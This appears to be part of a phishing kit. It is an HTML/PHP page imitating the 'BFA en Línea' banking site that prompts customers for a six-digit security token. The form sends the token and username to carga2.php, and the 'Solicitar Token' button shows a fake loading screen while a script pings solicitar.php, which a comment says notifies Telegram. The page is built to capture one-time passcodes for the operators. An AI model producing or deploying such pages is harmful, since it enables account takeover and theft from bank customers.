...
<title>BFA en Línea - Token</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  ...
  #modal-aviso{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.45)}
  #modal-aviso .box{background:#fff;border-radius:18px;padding:24px 23px 32px;max-width:380px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.18)}
  /* Overlay de carga al solicitar token */
  #overlay-solicitar{position:fixed;inset:0;z-index:10000;display:none;align-items:center;justify-content:center;background:rgb(251,251,251)}
  #overlay-solicitar img{max-width:500px;width:60vw;height:auto;display:block}
</style>
</head>
<body>
...
<div id="modal-aviso">
  <div class="box">
    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin:0 auto 20px">
      <circle cx="32" cy="32" r="29" stroke="#4caf50" stroke-width="4"/>
      <polyline points="18,33 28,43 47,22" stroke="#4caf50" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <p style="color:#022a4f;font-size:16px;font-weight:600;line-height:1.5;margin-bottom:28px">
      Estimado(a) cliente, hemos enviado el Token de Seguridad a tu correo electrónico o número telefónico registrado
    </p>
    <button onclick="document.getElementById('modal-aviso').style.display='none'"
      style="background:linear-gradient(135deg,#f5a623,#e8920d);color:#fff;border:none;border-radius:24px;padding:10px 44px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.5px">
      OK
    </button>
  </div>
</div>

<!-- OVERLAY LOADING (al solicitar token) -->
<div id="overlay-solicitar"><img src="img/loading.gif" alt="Cargando..."></div>
  ...
  <div class="body" style="flex:1;display:grid;grid-template-columns:1fr 460px;min-height:0">
    ...
    <div class="form-side" style="background:#fff;display:flex;flex-direction:column;align-items:center;padding:30px 40px">
      ...
      <div style="display:flex;align-items:center;justify-content:center;margin-top:10px;width:100%">
        <div style="width:72px;height:72px;border-radius:50%;background:#022a4f;display:flex;align-items:center;justify-content:center">
          <svg width="36" height="40" viewBox="0 0 36 40" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="3" y="18" width="30" height="21" rx="4" fill="white"/>
            <path d="M9 18V13a9 9 0 0 1 18 0v5" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
            <circle cx="18" cy="29" r="3.5" fill="#022a4f"/>
          </svg>
        </div>
      </div>

      <form class="form" method="POST" action="carga2.php" style="width:100%;max-width:320px;margin-top:24px">
        <input type="hidden" name="usuario" value="<?= htmlspecialchars($usuario) ?>">
        <label for="token" style="margin-left:38px;display:block;text-align:left;font-weight:600;color:#022a4f;font-size:15px;margin-bottom:8px">
          Token <span style="color:#e53935">*</span>
        </label>
        <input id="token" name="tok" type="text" inputmode="numeric" pattern="\d{6}" minlength="6" maxlength="6" placeholder="Ingrese Token (6 dígitos)" autocomplete="one-time-code" required
               style="background:#dddddd;color:#232323;outline:0;padding:6px 10px;border:0;border-radius:10px;font-size:14px;margin-left:39px;width:15rem;font-family:'Montserrat',sans-serif;letter-spacing:2px;text-align:center">

        <br><button class="btn-next" type="submit"
                style="background:linear-gradient(to right,#FF9012,#FFD700);color:#fff;border-radius:34px;padding:7px 25px;font-weight:600;border:0;cursor:pointer;outline:0;display:block;margin:18px auto 0;font-family:'Montserrat',sans-serif">
          Siguiente
        </button>

        <button class="btn-next" type="button" id="btnSolicitar"
                style="background:linear-gradient(to right,#FF9012,#FFD700);color:#fff;border-radius:34px;padding:7px 25px;font-weight:600;border:0;cursor:pointer;outline:0;display:block;margin:10px auto 0;font-family:'Montserrat',sans-serif">
          Solicitar <span style="color:#022a4f">Token</span>
        </button>
      </form>
...
<script>
  // Solo dígitos en el input del token
  document.getElementById('token').addEventListener('input', function(){
    this.value = this.value.replace(/\D/g, '').slice(0, 6);
  });

  // Botón "Solicitar Token": muestra overlay de carga 3 segundos y luego recarga (vuelve a salir el modal)
  document.getElementById('btnSolicitar').addEventListener('click', function(){
    this.disabled = true;
    document.getElementById('overlay-solicitar').style.display = 'flex';
    // Notifica a Telegram en segundo plano
    fetch('solicitar.php', { method: 'POST' }).catch(function(){});
    // Tras 3 segundos, recarga para mostrar el modal de aviso de nuevo
